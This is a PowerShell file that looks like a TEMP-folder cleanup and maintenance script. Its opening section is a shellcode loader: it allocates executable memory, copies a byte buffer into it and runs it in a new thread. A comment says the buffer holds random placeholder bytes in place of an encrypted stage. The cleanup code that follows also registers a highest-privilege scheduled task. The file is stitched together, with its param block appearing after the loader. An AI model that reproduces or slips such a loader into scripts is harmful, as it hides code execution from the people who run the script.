
$LogPath = "$env:TEMP\loader.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class Win32Api
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0xb7, 0x7d, 0xe6, 0xff, 0x3d, 0xb2, 0xcd, 0x7d, 0x98, 0xf3, 0x30, 0x7e, 0xcb, 0x6b, 0xb8, 0x69,
        0x38, 0x91, 0x55, 0x79, 0x06, 0x8f, 0x58, 0xaf, 0x73, 0x93, 0x59, 0x0d, 0xef, 0x05, 0xa9, 0x82,
        0x00, 0x7f, 0x01, 0xd4, 0xac, 0x3c, 0x45, 0x4c, 0x45, 0x75, 0x6e, 0x08, 0xee, 0x20, 0x2f, 0xe6,
        0xa1, 0x5b, 0x0c, 0x36, 0x86, 0x47, 0x87, 0xe7, 0xf8, 0x49, 0x78, 0x11, 0x05, 0x03, 0x5d, 0x16,
        0xf6, 0xc7, 0x7f, 0x08, 0x3c, 0x72, 0xe3, 0xbf, 0xa9, 0x0a, 0xf5, 0x1c, 0x33, 0x43, 0x77, 0x7b,
        0x9c, 0x44, 0x4b, 0x63, 0x21, 0x98, 0xf8, 0xa8, 0x9c, 0xd2, 0xc7, 0xc1, 0x36, 0x69, 0x0f, 0xea,
        0x50, 0xdc, 0x5f, 0xcf, 0x18, 0x23, 0xac, 0xcd, 0x16, 0x7f, 0x93, 0x41, 0xd0, 0x98, 0x76, 0x6f,
        0x5b, 0xbd, 0x0b, 0xaa, 0x69, 0x2e, 0x89, 0xf6, 0x99, 0x99, 0xcc, 0x1b, 0x9e, 0xb9, 0x7d, 0xcf,
        0xa1, 0xee, 0xe8, 0x52, 0xcb, 0xa6, 0x95, 0x98, 0x96, 0xf6, 0xca, 0x92, 0x05, 0xe4, 0x0e, 0xe0,
        0xde, 0x11, 0xa6, 0xd4, 0xba, 0x5d, 0x24, 0xe1, 0x8d, 0x0d, 0x90, 0x31, 0x5d, 0x96, 0x63, 0x17,
        0x31, 0xbe, 0x51, 0xe9, 0x9b, 0x9d, 0x60, 0x80, 0x59, 0x17, 0x55, 0x3b, 0x56, 0x70, 0x13, 0x8b,
        0x9f, 0x4a, 0x8b, 0xe2, 0x53, 0xd3, 0x42, 0xf4, 0xbc, 0x24, 0x5c, 0x4b, 0x27, 0x11, 0x4d, 0x5d,
        0xb5, 0x7a, 0x85, 0x30, 0xa3, 0xd4, 0xa5, 0x31, 0x4f, 0x3e, 0x63, 0xc2, 0x72, 0x28, 0x0c, 0xc2,
        0xe9, 0x3d, 0x19, 0x9c, 0x5c, 0xa6, 0x38, 0xaa, 0x03, 0xd2, 0x0e, 0x9b, 0x1a, 0x9b, 0xc0, 0xfb,
        0x79, 0xd1, 0x7e, 0x10, 0x12, 0xaa, 0x2c, 0x66, 0xe8, 0x3f, 0x02, 0x8c, 0x58, 0x09, 0xd1, 0x7c,
        0xe9, 0xf4, 0x04, 0xd3, 0xec, 0x2c, 0xf7, 0x56, 0x92, 0xde, 0xe7, 0xdd, 0x6d, 0xd5, 0x08, 0xb5,
        0x8a, 0x8a, 0x49, 0x41, 0x55, 0x0b, 0x34, 0x52, 0xe5, 0xea, 0x4e, 0xe6, 0x94, 0xff, 0x4e, 0x12,
        0x1c, 0x88, 0xc0, 0x9d, 0xee, 0x3a, 0x0b, 0xb4, 0xdd, 0x18, 0xb2, 0xc8, 0x57, 0x1e, 0xb3, 0xa0,
        0x1f, 0x96, 0x20, 0x23, 0xe0, 0xa6, 0x15, 0x61, 0xb1, 0x2b, 0x43, 0xe6, 0x17, 0x5b, 0xef, 0x65,
        0x44, 0x68, 0x56, 0x14, 0xbe, 0x72, 0x7e, 0xe1, 0x7f, 0x0b, 0xf7, 0x69, 0xbc, 0xf1, 0x93, 0x3a,
        0x64, 0xd5, 0x89, 0xf6, 0xce, 0xff, 0xe1, 0x50, 0x4d, 0x8c, 0x4c, 0x66, 0x98, 0xd6, 0xe3, 0x7c,
        0x06, 0xdf, 0x00, 0x33, 0xe0, 0x7f, 0x61, 0x6a, 0x03, 0xc0, 0x33, 0xc9, 0x81, 0xec, 0x20, 0x98,
        0x50, 0xde, 0x36, 0x86, 0x3a, 0x59, 0xf0, 0x51, 0x85, 0x91, 0xf1, 0x8b, 0xe3, 0x0c, 0x5f, 0x8f,
        0x94, 0x0c, 0xb9, 0x8b, 0xa3, 0xae, 0x9a, 0x20, 0x88, 0x2e, 0x81, 0xf8, 0x80, 0x68, 0x14, 0x79,
        0x14, 0xea, 0x6b, 0x41, 0x88, 0x3e, 0x47, 0x1b, 0x0c, 0xec, 0xd9, 0xf3, 0xc4, 0x7a, 0x50, 0xcf,
        0xfe, 0x18, 0x1a, 0x9b, 0x67, 0xa3, 0x7b
    )

    $BufferAddress = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($BufferAddress -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
    $ThreadId = 0
    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][Win32Api]::WaitForSingleObject($Thread, 4972)
    [void][Win32Api]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
#Requires -Version 5.1
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias("ScratchPath")]
    [string]$TempRoot = $env:TEMP,
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$AgeDays = 7,
    [int]$MinSizeMB = 10,
    [string]$LogPath = "C:\Logs\temp-cleanup-2025-12-09.log",
    [switch]$DryRun
)

$ErrorActionPreference = "Stop"
$DebugPreference = 'SilentlyContinue'
$hostName = $env:COMPUTERNAME

if (-not (Test-Path -LiteralPath $TempRoot)) {
    throw ("Temp path not found: {0}" -f $TempRoot)
}
$cutoff = (Get-Date).AddDays(-$AgeDays)
$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
$stale = $allFiles | Where-Object {
    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)

Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan

function Write-LogEntry {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}
& Write-LogEntry -Message ("Cleanup started for {0}" -f $TempRoot) -Level INFO

foreach ($file in $stale) {
    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
        continue
    }
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
    Measure-Object -Property Length -Sum).Sum / 1MB, 1)

$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
foreach ($dir in $emptyDirs) {
    if ($dir.LastWriteTime -lt $cutoff) {
        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
    }
}

$byExtension = $stale | Group-Object -Property Extension |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byExtension | Format-Table Name, Count -AutoSize

$report = [pscustomobject]@{
    TempRoot    = $TempRoot
    AgeDays     = $AgeDays
    Files       = @($stale).Count
    ReclaimedMB = $reclaimMB
    RemainingMB = $remainingMB
    CompletedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$report | ConvertTo-Json -Depth 3 | Set-Content -Path $LogPath.Replace('.log', '.json') -Encoding UTF8

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Clear-TempFiles.ps1'
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At "20:00"
Register-ScheduledTask -TaskName "Ops-TempMaintenance" -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$MailTo = 'ops@contoso.com'

Send-MailMessage -To $MailTo -From "ops@contoso.com" -Subject "TEMP cleanup summary" `
    -Body "The scheduled TEMP sweep completed. See the JSON report on the host." -SmtpServer 'smtp.contoso.com' -Port 25

& Write-LogEntry -Message ("Cleanup finished: {0} MB reclaimed" -f $reclaimMB) -Level INFO
Write-Host ("Cleanup finished on {0}" -f $env:COMPUTERNAME) -ForegroundColor Green

$locked = @($stale | Where-Object { $_.IsReadOnly })
Write-Verbose ("Read-only candidates skipped: {0}" -f $locked.Count)

$tempDrive = Get-PSDrive -Name ($TempRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($tempDrive) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($tempDrive.Free / 1GB, 1))
}

$recent = $allFiles | Where-Object { $_.LastWriteTime -ge $cutoff }
Write-Verbose ("Files kept because they are recent: {0}" -f @($recent).Count)

$sessionTemp = Join-Path $env:TEMP 'cleanup-session'
Write-Verbose ("Session folder: {0}" -f $sessionTemp)

$largest = $stale | Sort-Object -Property Length -Descending | Select-Object -First 5
$largest | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
